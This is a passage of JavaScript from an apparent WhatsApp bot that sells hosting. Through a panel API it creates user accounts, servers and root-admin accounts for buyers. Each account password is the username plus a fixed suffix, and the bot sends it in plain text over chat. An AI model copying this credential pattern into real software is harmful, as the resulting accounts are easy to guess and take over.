let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "17gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "17GB"
let egg = global.eggsnya
let loc = global.location
let memo = "17240"
let cpu = "450"
let disk = "17240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "15gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "15GB"
let egg = global.eggsnya
let loc = global.location
let memo = "15240"
let cpu = "420"
let disk = "15240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "16gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "16GB"
let egg = global.eggsnya
let loc = global.location
let memo = "16240"
let cpu = "410"
let disk = "16240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "14gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "14GB"
let egg = global.eggsnya
let loc = global.location
let memo = "14240"
let cpu = "360"
let disk = "14240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "13gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "13GB"
let egg = global.eggsnya
let loc = global.location
let memo = "13240"
let cpu = "230"
let disk = "13240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "12gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "12GB"
let egg = global.eggsnya
let loc = global.location
let memo = "12240"
let cpu = "310"
let disk = "12240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "11gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "11GB"
let egg = global.eggsnya
let loc = global.location
let memo = "11240"
let cpu = "280"
let disk = "11240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "addadmin2": {
if (!isOwner) return reply("Khusus Owner👑")
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "j1us9"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: Rahasia 🤫🧏
`
    const listMessage = {

        text: tks,

    }

	

    await tamzz.sendMessage(m.chat, listMessage)

    await tamzz.sendMessage(nomornya, {

